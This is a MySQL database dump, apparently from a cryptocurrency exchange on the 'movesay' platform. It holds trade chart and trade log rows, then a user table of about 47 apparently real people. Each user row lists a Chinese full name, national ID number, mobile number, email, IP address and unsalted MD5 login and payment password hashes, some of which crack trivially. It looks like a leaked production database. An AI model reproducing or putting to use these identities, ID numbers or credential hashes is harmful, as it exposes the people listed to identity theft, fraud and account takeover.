INSERT INTO `movesay_trade_json` VALUES ('749005', 'sgc_cny', '[1506395066,\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '1', '0', '1506395066', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('733643', 'sgc_cny', '[1506158820,\"10000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '3', '0', '1506158820', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('748357', 'sgc_cny', '[1506416400,\"1000.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '1440', '0', '1506416400', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('746252', 'sgc_cny', '[1506394980,\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '3', '0', '1506394980', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('745154', 'sgc_cny', '[1506394800,\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '5', '0', '1506394800', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('743958', 'sgc_cny', '[1506394800,\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '10', '0', '1506394800', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('751672', 'sgc_cny', '[1506481286,\"1000.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '1', '0', '1506481286', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('743380', 'sgc_cny', '[1506394800,\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '15', '0', '1506394800', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('751342', 'sgc_cny', '', '240', '0', '1506488400', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('751341', 'sgc_cny', '', '120', '0', '1506488400', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('750664', 'sgc_cny', '[1506481200,\"1000.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '3', '0', '1506481200', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('750283', 'sgc_cny', '[1506481200,\"1000.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '5', '0', '1506481200', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('750238', 'sgc_cny', '', '30', '0', '1506483000', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('742753', 'sgc_cny', '[1506394800,\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '30', '0', '1506394800', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('749794', 'sgc_cny', '[1506481200,\"1000.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '10', '0', '1506481200', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('742385', 'sgc_cny', '[1506394800,\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '60', '0', '1506394800', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('749626', 'sgc_cny', '[1506481200,\"1000.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '15', '0', '1506481200', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('749422', 'sgc_cny', '[1506481200,\"1000.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '30', '0', '1506481200', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('749859', 'sgc_cny', '', '10', '0', '1506481800', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('742106', 'sgc_cny', '[1506394800,\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '120', '0', '1506394800', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('749309', 'sgc_cny', '[1506481200,\"1000.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '60', '0', '1506481200', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('750752', 'sgc_cny', '', '60', '0', '1506484800', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('741928', 'sgc_cny', '[1506387600,\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '240', '0', '1506387600', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('741939', 'sgc_cny', '[1506394800,\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '360', '0', '1506394800', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('741944', 'sgc_cny', '[1506373200,\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '720', '0', '1506373200', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('741946', 'sgc_cny', '[1506330000,\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '1440', '0', '1506330000', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('749167', 'sgc_cny', '[1506481200,\"1000.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '120', '0', '1506481200', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('749173', 'sgc_cny', '[1506474000,\"1000.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '240', '0', '1506474000', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('749177', 'sgc_cny', '[1506481200,\"1000.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '360', '0', '1506481200', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('749179', 'sgc_cny', '[1506459600,\"1000.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\",\"1.00000000\"]', '720', '0', '1506459600', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('749795', 'sgc_cny', '', '15', '0', '1506482100', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('750289', 'sgc_cny', '', '5', '0', '1506483000', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('750288', 'sgc_cny', '', '5', '0', '1506482700', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('750287', 'sgc_cny', '', '5', '0', '1506482400', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('750286', 'sgc_cny', '', '5', '0', '1506482100', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('750285', 'sgc_cny', '', '5', '0', '1506481800', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('750284', 'sgc_cny', '', '5', '0', '1506481500', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('750667', 'sgc_cny', '', '3', '0', '1506481740', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('750666', 'sgc_cny', '', '3', '0', '1506481560', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('750665', 'sgc_cny', '', '3', '0', '1506481380', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('751682', 'sgc_cny', '', '10080', '0', '1506675600', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('751681', 'sgc_cny', '', '1440', '0', '1506502800', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('751680', 'sgc_cny', '', '720', '0', '1506502800', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('751679', 'sgc_cny', '', '360', '0', '1506502800', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('751678', 'sgc_cny', '', '1', '0', '1506481646', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('751677', 'sgc_cny', '', '1', '0', '1506481586', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('751676', 'sgc_cny', '', '1', '0', '1506481526', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('751675', 'sgc_cny', '', '1', '0', '1506481466', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('751674', 'sgc_cny', '', '1', '0', '1506481406', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('751673', 'sgc_cny', '', '1', '0', '1506481346', '0', '0');
INSERT INTO `movesay_trade_json` VALUES ('741724', 'sgc_cny', '[1506158906,\"10000.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\",\"7.00000000\"]', '1', '0', '1506158906', '0', '0');

-- ----------------------------
-- Table structure for movesay_trade_log
-- ----------------------------
DROP TABLE IF EXISTS `movesay_trade_log`;
CREATE TABLE `movesay_trade_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `peerid` int(11) unsigned NOT NULL,
  `market` varchar(50) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `fee_buy` decimal(20,8) unsigned NOT NULL,
  `fee_sell` decimal(20,8) unsigned NOT NULL,
  `type` tinyint(2) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`),
  KEY `peerid` (`peerid`),
  KEY `main` (`market`,`status`,`addtime`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=358507 DEFAULT CHARSET=gbk;

-- ----------------------------
-- Records of movesay_trade_log
-- ----------------------------
INSERT INTO `movesay_trade_log` VALUES ('358500', '4966', '4944', 'sgc_cny', '7.00000000', '5000.00000000', '35000.00000000', '0.00000000', '5.00000000', '1', '0', '1505466386', '0', '1');
INSERT INTO `movesay_trade_log` VALUES ('358501', '5022', '4944', 'sgc_cny', '7.00000000', '10000.00000000', '70000.00000000', '0.00000000', '5.00000000', '1', '0', '1506158924', '0', '1');
INSERT INTO `movesay_trade_log` VALUES ('358502', '5045', '5043', 'sgc_cny', '1.00000000', '1.00000000', '1.00000000', '0.00000000', '5.00000000', '1', '0', '1506395079', '0', '1');
INSERT INTO `movesay_trade_log` VALUES ('358503', '5051', '5050', 'sgc_cny', '1.00000000', '1000.00000000', '1000.00000000', '0.00000000', '5.00000000', '1', '0', '1506481314', '0', '1');
INSERT INTO `movesay_trade_log` VALUES ('358504', '5058', '5048', 'sgc_cny', '1.00000000', '10.00000000', '10.00000000', '0.00000000', '5.00000000', '1', '0', '1514877368', '0', '1');
INSERT INTO `movesay_trade_log` VALUES ('358505', '5058', '5048', 'sgc_cny', '2.00000000', '1.00000000', '2.00000000', '0.00000000', '5.00000000', '1', '0', '1514878811', '0', '1');
INSERT INTO `movesay_trade_log` VALUES ('358506', '5095', '5048', 'sgc_cny', '1.00000000', '10.00000000', '10.00000000', '0.00000000', '5.00000000', '1', '0', '1515489224', '0', '1');

-- ----------------------------
-- Table structure for movesay_user
-- ----------------------------
DROP TABLE IF EXISTS `movesay_user`;
CREATE TABLE `movesay_user` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `moble` varchar(50) NOT NULL,
  `mobletime` int(11) unsigned NOT NULL,
  `password` varchar(32) NOT NULL,
  `tpwdsetting` varchar(32) NOT NULL,
  `paypassword` varchar(32) NOT NULL,
  `invit_1` varchar(50) NOT NULL,
  `invit_2` varchar(50) NOT NULL,
  `invit_3` varchar(50) NOT NULL,
  `truename` varchar(32) NOT NULL,
  `idcard` varchar(32) NOT NULL,
  `logins` int(11) unsigned NOT NULL,
  `ga` varchar(50) NOT NULL,
  `addip` varchar(50) NOT NULL,
  `addr` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  `email` varchar(200) DEFAULT NULL COMMENT '邮箱',
  `alipay` varchar(200) DEFAULT NULL COMMENT '支付宝',
  `invit` varchar(50) NOT NULL,
  `token` varchar(50) DEFAULT NULL,
  `Country` varchar(200) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `username` (`username`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=5142 DEFAULT CHARSET=utf8 COMMENT='用户信息表';

-- ----------------------------
-- Records of movesay_user
-- ----------------------------
INSERT INTO `movesay_user` VALUES ('4887', 'wrx9795', '15369195442', '1505280582', 'da7600491219446a1c27af63ea1acd46', '1', 'cec3e262570dc2078033108113e63ca8', '0', '0', '0', '王晶', '652302197907150044', '5', '', '117.136.39.210', '未分配或者内网IP', '0', '1505280218', '0', '1', 'wangseisei@163.com', null, 'FCNMRG', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4886', 'X316795668', '18806658998', '1505275562', '0b91204057e8c14aef4c273a5bbef90b', '1', 'e3f7b7e4288c51648514850f05d8b78f', '0', '0', '0', '', '', '3', '', '182.97.118.224', '未分配或者内网IP', '0', '1505275167', '0', '1', '316795668@qq.com', null, 'WZUEFB', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4888', 'zz6661', '13339090017', '1505353066', '3d24b838770ee90773804e8599e549ff', '1', '8aeef4d373e3374a5da97d3e00261507', '0', '0', '0', '姚丽仙', '342723195402210322', '5', '', '223.215.6.112', '未分配或者内网IP', '0', '1505352697', '0', '1', '3538303081@qq.com', null, 'MJPDVI', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4889', 'lgx666', '13329095958', '1505378425', '214c211273301887c3833857da49801d', '1', '8a6f2805b4515ac12058e79e66539be9', '0', '0', '0', '刘国香', '342723197210100064', '10', '', '223.215.18.85', '未分配或者内网IP', '0', '1505377040', '0', '1', '398775735@qq.com', null, 'WCBIJT', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4890', 'ly13939713630', '13939713630', '1505432113', '8fffc6e150bec7367032866bf3421214', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '李艳', '413023197412062722', '3', '', '123.151.42.47', '未分配或者内网IP', '0', '1505377731', '0', '1', '616587717@qq.com', '13939713630', 'ERSCQB', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4891', 'x15690807070', '15690807070', '1505381859', '900ca2a63e0e1a0e6ec854d43d644e43', '1', '566779501e72888d25f579ea777e6c92', '0', '0', '0', '史凯', '411202198702064517', '4', '', '61.158.147.185', '未分配或者内网IP', '0', '1505377790', '0', '1', '285199590@qq.com', '285199590@qq.com', 'MLAEKZ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4892', 'x15103751187', '15103751187', '1505393610', '57407dc8d2c9166e131bfd1ac730e801', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '管小刚', '410481198203143531', '1', '', '61.158.147.185', '未分配或者内网IP', '0', '1505377897', '0', '1', '904260819@qq.com', '15103751187', 'CHYFTM', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4893', 'S15893487280', '', '0', 'e10adc3949ba59abbe56e057f20f883e', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '', '', '0', '', '36.99.197.15', '未分配或者内网IP', '0', '1505378249', '0', '1', null, null, 'AKJXLZ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4894', 'clz888', '13717030781', '1505378722', '85a67231e3b5c81ae525ff35532626a2', '1', 'd7407715afb7ec4be1f2ae459ee8b81b', '0', '0', '0', '陈兰招', '360726198403085222', '0', '', '183.12.100.10', '未分配或者内网IP', '0', '1505378545', '0', '1', '13717030781@163.co', '13717030781', 'SJAGTW', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4895', 'y13522263948', '', '0', '0fb269bf2fd37550ea8423e1be3805c6', '1', 'f4dbb8edca5fabc4c11da6e8ce32657b', '0', '0', '0', '余玉喜', '150202196903300615', '0', '', '121.22.150.105', '未分配或者内网IP', '0', '1505378716', '0', '1', 'btyuyuxi@yeah.net', null, 'GJIYEL', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4896', 'x13847003930', '13847003930', '1505378932', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '敖秋艳', '152104196408024122', '1', '', '61.158.147.185', '未分配或者内网IP', '0', '1505378731', '0', '1', '690080883@qq.com', '18533346627', 'DRGIJK', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4897', 'x13403751905', '', '0', 'cd586e359230d6f49f49d5fbf54f62ba', '1', '088eac4ae136d667c862995770bb7ab6', '0', '0', '0', '杨红妮', '410412197008156081', '0', '', '140.207.54.187', '未分配或者内网IP', '0', '1505378976', '0', '1', '13403751905@163.co', null, 'EKDNXS', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4898', 'a13698843117', '', '0', 'd8c020a09404eba72d82708f9ea710e4', '1', 'bf608274e3ea081d538d52e0892bb4bf', '0', '0', '0', '王朋', '411326198110141511', '2', '', '123.126.118.139', '未分配或者内网IP', '0', '1505379333', '0', '1', '1460953497@qq.com', null, 'BHILAZ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4899', 'lhq13781080587', '13781080587', '1505380444', '2790454996ac12cd103a7bc5e7b053ae', '1', 'ab5065e91279014d7237e8b5df9cccf3', '0', '0', '0', '刘会勤', '41048119730209702x', '1', '', '140.207.185.125', '未分配或者内网IP', '0', '1505379829', '0', '1', '454362338@qq.com', '13781080587', 'IDVEZX', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4900', 'dongxue', '', '0', '37478a0354dcf12039fe949718ae07b5', '1', '086627f2146ea9f1237f0fdd578d3dc7', '0', '0', '0', '李巍', '210381197108035914', '1', '', '223.104.176.82', '未分配或者内网IP', '0', '1505379871', '0', '1', '969994480@qq.com', null, 'HXZYQE', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4901', 'x151231980021863', '', '0', '75e266f182b4fa3625d4a4f4f779af54', '1', '', '0', '0', '0', '', '', '0', '', '61.158.147.185', '未分配或者内网IP', '0', '1505380074', '0', '1', null, null, 'JYTSQG', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4902', 'wxh1627', '', '0', 'b49af06d36edac6b8294ebc810296c04', '1', '5eaaeb754e405543d7b368c61e994b8e', '0', '0', '0', '', '', '0', '', '123.126.126.125', '未分配或者内网IP', '0', '1505380092', '0', '1', null, null, 'CKJHUR', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4903', 'x15122889862', '15122889862', '1505380508', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '吴海艳', '152123198002186365', '0', '', '61.158.147.185', '未分配或者内网IP', '0', '1505380140', '0', '1', '1877626956@qq.com', '15122889862', 'PATVCE', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4904', 'yiran201216', '17192187548', '1505380507', 'e120ea280aa50693d5568d0071456460', '1', 'db459cd583c215cbcc3fdd4990ce0047', '0', '0', '0', '丁永平', '34122219900320632X', '1', '', '118.212.196.101', '未分配或者内网IP', '0', '1505380177', '0', '1', '1446374252@qq.com', '1446374252@qq.com', 'KBAZDT', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4905', 'X13536641088', '13536641088', '1505388373', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '王彬', '410481199702082010', '6', '', '223.104.105.166', '未分配或者内网IP', '0', '1505380620', '0', '1', '1205458239@qq.com', '13536641088', 'KEIPRZ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4906', 'wfl8899', '13567083789', '1505381232', '8b5854f62b91f10e7a0b906ac62107f0', '1', '7295bfd89a82d921d643b595c52779f6', '0', '0', '0', '吴峰林', '330823197104030017', '1', '', '39.186.138.196', '未分配或者内网IP', '0', '1505381102', '0', '1', '634520531@qq.com', '13567083789', 'KJTPIE', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4907', 'p13781888871', '', '0', 'f1daf30aee23c0ce26c86e23d98aacaa', '1', '002772406c000396fd4704af816b075f', '0', '0', '0', '赵延平', '410412196308070023', '1', '', '101.226.125.121', '未分配或者内网IP', '0', '1505381136', '0', '1', '327580058@qq.com', null, 'RXAMCJ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4908', 'w18689232398', '18689232398', '1505381962', '2790454996ac12cd103a7bc5e7b053ae', '1', '8501d714f3a54865a128f8baf1306bc7', '0', '0', '0', '文德华', '511023197506172465', '3', '', '101.226.125.114', '未分配或者内网IP', '0', '1505381308', '0', '1', '1026642372@qq.com', '18689232398', 'FKJVTM', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4909', 'x15547078597', '15547078597', '1505381729', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '苑清彬', '152104197510114110', '4', '', '61.158.147.185', '未分配或者内网IP', '0', '1505381387', '0', '1', '2443354142@qq.com', '15547078597', 'MUZIAQ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4910', 'x13948801627', '13948801627', '1505383317', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '马淑华', '152104197004154128', '2', '', '61.158.147.185', '未分配或者内网IP', '0', '1505382127', '0', '1', '1046770705@qq.com', '13948801627', 'WXICHT', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4911', 'x13839811616', '13839811616', '1505382677', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '张春红', '411202197407152026', '3', '', '61.158.147.185', '未分配或者内网IP', '0', '1505382208', '0', '1', '765207246@qq.com', '13839811616', 'BWEZJF', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4912', 'xzh13918412360', '18255374578', '1505382404', '355fc5286b8dc3bb1bc22c79beca8eac', '1', 'dcd9cc4f7a3d719694d6b1021d5b5e87', '0', '0', '0', '谢智慧', '341024197512124157', '1', '', '36.35.32.110', '未分配或者内网IP', '0', '1505382218', '0', '1', '649244549@qq.com', null, 'REKNXM', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4913', 'zh13329038681', '13329038681', '1505383190', '355fc5286b8dc3bb1bc22c79beca8eac', '1', 'dcd9cc4f7a3d719694d6b1021d5b5e87', '0', '0', '0', '朱红', '340202197610190029', '0', '', '36.35.32.110', '未分配或者内网IP', '0', '1505383079', '0', '1', '594267442@qq.com', null, 'IBMYKX', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4914', 'x18188833588', '18188833588', '1505383968', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '蔡健锋', '440902198204100418', '0', '', '61.158.147.185', '未分配或者内网IP', '0', '1505383771', '0', '1', '1930353@qq.com', '18188833588', 'AIGRSL', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4915', 'zxf13837326669', '13837326669', '1505384775', '5949d48b3e54c09db970fb9de152db0d', '1', 'd4f2ebefed231041dee95d20b4231429', '0', '0', '0', '甄宪锋', '410728197502201033', '1', '', '183.204.103.250', '未分配或者内网IP', '0', '1505383962', '0', '1', '1401222593@qq.com', null, 'RKEAVW', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4916', 'lzt9999', '15264427181', '1505385213', '16c038bdc9b2fb626d13f5e9e3c00866', '1', 'f2b2b838ce3cfcdb026bf628c83983f0', '0', '0', '0', '李志堂', '370727197209265178', '1', '', '182.46.10.146', '未分配或者内网IP', '0', '1505385087', '0', '1', '1533196619@qq.com', '15264427181', 'LAWSDI', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4917', 'sf13569837572', '13569837572', '1505387089', 'c17e002e8df2c545e831b4d06babe863', '1', 'c51125fffcc7b7491d3d3abb5f0b6eaf', '0', '0', '0', '宋妨', '410728197504291044', '1', '', '183.204.103.250', '未分配或者内网IP', '0', '1505385501', '0', '1', '1506798430@qq.com', null, 'ZEMAQX', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4918', 'fxm88888', '18367081606', '1505387201', 'ae9e0a2d7aaa378eddc05f57f5a3acd9', '1', '97ccb57a210b2e175a71d3237e17fc5a', '0', '0', '0', '方小米', '330822198404180920', '0', '', '101.226.125.18', '未分配或者内网IP', '0', '1505385626', '0', '1', '2449587294@qq.com', '18367081606', 'GTBZUQ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4919', 'youyu001', '', '0', '41bde5a23e6a8c67a65785ca0a41bc98', '1', '199a9e5580683e38c14c50a59161ac81', '0', '0', '0', '孙国平', '132624198506247512', '0', '', '125.39.210.27', '未分配或者内网IP', '0', '1505385992', '0', '1', '635835586@qq.com', null, 'GINMCK', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4920', 'gk13523876316', '13523876316', '1505386367', '421d249c5eb79993b11ed55b69919d68', '1', '8ac8929874f96893246d1d5dbbfc2ce5', '0', '0', '0', '高奎', '410728197708161030', '0', '', '183.204.103.250', '未分配或者内网IP', '0', '1505386114', '0', '1', '2639962179@qq.com', null, 'SHTKZQ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4921', 'wsf88888', '15372718725', '1505483580', 'ae9e0a2d7aaa378eddc05f57f5a3acd9', '1', '97ccb57a210b2e175a71d3237e17fc5a', '4918', '0', '0', '吴素芳', '33082219781016362x', '3', '', '101.226.125.18', '未分配或者内网IP', '0', '1505387697', '0', '1', '237615459@qq.com', null, 'BJGQRW', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4922', 'qun923', '', '0', '8a6f2805b4515ac12058e79e66539be9', '1', '27aac8e38a8c909147b07ab7c0ea6f63', '0', '0', '0', '陈贵群', '42062519890923252X', '0', '', '101.226.125.19', '未分配或者内网IP', '0', '1505388774', '0', '1', '576116409@qq.com', null, 'TCDNXY', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4923', 'x13253983334', '13253983334', '1505394493', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', ' 王少龙', '411202199302014515', '4', '', '61.158.146.171', '未分配或者内网IP', '0', '1505388895', '0', '1', '369860712@qq.com', null, 'DEUYMQ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4924', 'zcw88888', '', '0', 'ae9e0a2d7aaa378eddc05f57f5a3acd9', '1', '799d0cb3c0cc70ce1a15718029f6737e', '0', '0', '0', '周春旺', '330823197209254711', '0', '', '101.226.102.60', '未分配或者内网IP', '0', '1505389934', '0', '1', '1915856749@qq.com', null, 'ABSFXT', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4925', 'js1907620617', '', '0', 'a84cba281576d538e8734e09eeb6b520', '1', '7a7b595f43a5204147d5c53da10b97f2', '0', '0', '0', '韦玉芳', '452127197612043021', '1', '', '14.17.37.144', '未分配或者内网IP', '0', '1505390420', '0', '1', '1255529116@qq.com', null, 'CGERTN', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4926', 'mm5288', '', '0', '9b04af41381ac09dec30168c323cb546', '1', '6a3e416855d5613f5bc01e448e55f3a0', '0', '0', '0', '陈小明', '43092319880805204X', '2', '', '101.226.125.120', '未分配或者内网IP', '0', '1505392179', '0', '1', '434517289@qq.com', null, 'MZBVND', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4927', 'xy0219', '', '0', '6685645590ded53a3a0b2b215a138b4d', '1', '4927507e5980adc19751f7106338ee44', '0', '0', '0', '熊玲玲', '413001198102265643', '1', '', '14.17.37.146', '未分配或者内网IP', '0', '1505392910', '0', '1', '18037617809@qq.com', null, 'RPIVSF', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4928', 'gL5299', '', '0', 'a958a917ae9caf72a85d30dcc000f8c6', '1', 'ff27f3b9bd1e0d76bfa8f530cf98a724', '0', '0', '0', '邹高连', '362502198606126020', '7', '', '101.226.125.117', '未分配或者内网IP', '0', '1505392966', '0', '1', '2677934924@qq.com', null, 'MGTXSB', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4929', 'x13383980881', '13383980881', '1505394911', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '郭菊', '411202197504220529', '0', '', '61.158.146.171', '未分配或者内网IP', '0', '1505394744', '0', '1', '3114396311@qq.com', null, 'UCEJVF', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4930', 'x15660173853', '15660173853', '1505395408', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '屈新银', '411326198405114414', '0', '', '61.158.146.171', '未分配或者内网IP', '0', '1505395121', '0', '1', '463532242@qq.com', null, 'AYFNRZ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4931', 'x13138523252', '13138523252', '1505396057', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '蔡晓燕', '441224198309281762', '0', '', '111.161.57.52', '未分配或者内网IP', '0', '1505395917', '0', '1', '598500514@qq.com', null, 'HNIMVS', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4932', 'x13273094176', '13273094176', '1505396419', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '习占铁', '411222196509180512', '0', '', '61.158.146.171', '未分配或者内网IP', '0', '1505396241', '0', '1', '13273094176@qq.com', null, 'SHJBND', null, 'CN');
INSERT INTO `movesay_user` VALUES ('4933', 'x15660972757', '15660972757', '1505396441', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '朱玉霞', '412922197102220045', '0', '', '111.161.57.52', '未分配或者内网IP', '0', '1505396293', '0', '1', '809747158@qq.com', null, 'FUYMDB', null, 'CN');
